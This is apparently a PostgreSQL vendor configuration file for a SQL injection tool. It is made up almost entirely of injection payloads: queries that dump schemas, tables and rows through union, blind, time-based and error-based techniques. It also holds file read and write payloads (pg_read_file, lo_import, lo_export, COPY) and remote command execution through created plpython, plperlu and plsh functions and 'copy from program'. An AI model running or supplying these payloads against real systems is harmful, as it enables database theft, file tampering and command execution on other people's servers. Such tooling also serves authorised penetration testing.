vendor: Postgres

resource:
 info: |
  /* Method concat_ws exists since pg 9.1 only
     concat_ws(
         '${enclose_value_sql}',
         version(),
         current_database(),
         user
     ) */
  version()
  || '${enclose_value_sql}'
  || current_database()
  || '${enclose_value_sql}'
  || user

 schema:
  database: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_schema r,
                       count(table_name) q
                   from information_schema.tables
                   group by r
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )

  table: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_name r,
                       '0' q
                   from information_schema.tables
                   where tables.table_schema = '${database}'
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )

  column: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       columns.column_name r,
                       '0' q
                   from information_schema.columns
                   where columns.table_schema = '${database}'
                   and columns.table_name = '${table}'
                   order by r
                   ${limit}
               )x
           ),
           '${separator_cell_sql}'
       )

  row:
   query: |
    select
        array_to_string(
            array(
                select
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
                    || q::text
                    || '${enclose_value_sql}'
                from (
                    select
                        substr((${fields}), 1, 775) r,
                        count(*) q
                    from ${database}.${table}
                    group by r
                    ${limit}
                )x
            ),
            '${separator_cell_sql}'
        )
   fields:
    field: trim(coalesce(${field.value}::text, ''))
    concat: "|| '%7f' ||"

 exploit: |
  file:
   read:
    fromDataFolder: pg_read_file('${filepath}')
    largeObject:
     fromPath: SELECT lo_import('%s')::text
     toText: SELECT convert_from(lo_get(%s),'utf8')::text
    fromTempTable: array_to_string(array(select * from %s),'\n')
   write:
    largeObject:
     fromText: SELECT lo_from_bytea(0, '%s')::text
     toFile: SELECT lo_export(%s, '%s')::text
    tempTable:
     drop: ;drop table %s;
     add: ;create table %s(data text);
     fill: ;copy %s(data) from '%s' delimiter E'\x01';
  
  rce:
   extension:
    create: ;CREATE EXTENSION %s;
    languages: select array_to_string(array(select lanname FROM pg_language),'')
   # drop both functions from sql and other extensions
   dropFunc: ;DROP function exec_cmd(text);DROP function exec_cmd();
   runFunc: SELECT exec_cmd('%s')||'%s'
   plpython: |
    ; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%%20$$%%0a
    from subprocess import check_output as c %%0a
    return c(cmd).decode() %%0a
    $$%%20LANGUAGE %s;
   plperlu: |
    ; CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;
   plsh: |
    ; CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;
   sql:
    dropTable: ;DROP TABLE IF EXISTS cmd_result;
    createTable: ;Create table cmd_result (str text);
    confirm:
     # unused signature arg and return text to avoid function duplicate
     addFunc: ;Create Or Replace Function exec_cmd(cmd TEXT) RETURNS void As%20$$%0acopy cmd_result from program 'echo%20"13""37"'%0a$$%20language sql;
     funcExists: SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'
    resultCmd: select array_to_string(array(select str FROM cmd_result),'\n')||'%s'
    runCmd: ;select exec_cmd('');
    clean: ;delete from cmd_result;
    runFunc: ;Create Or Replace Function exec_cmd(cmd TEXT) RETURNS void As%%20$$%%0acopy cmd_result from program '%s'%%0a$$%%20language sql;
  
  shell:
   confirmWeb: echo "iamin$((133707330+1))"
   confirmSql: select 1337

strategy:
 configuration:
  slidingWindow: |
   select
       /* Coalesce appends trail when end of string (${lead}${trail}).
          TODO Cleaner lead (similar to 0+1) */
       '${lead_pipe}'
       || coalesce(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           ''
       )
       || '${trail_sql}'
  limit: limit 65536 offset ${limit.value}
  failsafe: (1337${indice}7330%2b1)::text
  calibrator: repeat('${calibrator_sql}', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    # Spring
    - Unterminated string literal started at position \\d+ in SQL .*. Expected .* char
    - Unterminated identifier started at position \\d+ in SQL .*. Expected .* char
    - 'ERROR: syntax error at or near ".*"[\\r\\n]+  Position: \\d+'
    - 'ERROR: syntax error at end of input[\\r\\n]+  Position: \\d+'
    # Other
    - "ERROR: unterminated quoted identifier at or near"
    - "Query failed: ERROR:  unterminated quoted string at or near"
    - function\\.pg
    - cratedb
    - cockroachdb
    - enterprisedb
    - greenplum
    - opengauss
    - postgres
    - redshift
    - timescaleDB
    - yugabytedb
   orderByErrorMessage:
    # Collision with vertica
    - (?<!Vertica.*)ORDER BY position 1337 is not in select list
   vendorSpecific: case when ${test} then'a'else'b'end='a'::text

 union:
  indices: union select ${indices}
  capacity: (select '${lead_pipe}' || ${indice} || ${calibrator})
  orderBy: order by 1337

 binary:
  test:
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${injection}),
                ${window.char},
                1
            )
        )
        %26${bit}
    )
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}
  time: |
   ${binary.mode} ''=''
   || (
       select
           case when ${test}
           then ''
           else pg_sleep(${sleep_time})
       end
   )

 error:
  method:
  
   - name: Cast:or
     query: |
      /* ERROR: invalid input syntax for type numeric: "<sqli>" */
      or 1 = cast((
          ${window}
          )::text as numeric
      )
     capacity: 255
     
   - name: Cast:and
     query: |
      and 1 = cast((
          ${window}
          )::text as numeric
      )
     capacity: 255
     
   - name: Cast:order by
     query: |
      1, cast((
          ${window}
          )::text as numeric
      )
     capacity: 255

   - name: Cast:stack
     query: |
      ; select cast((
          ${window}
          )::text as numeric
      )
     capacity: 255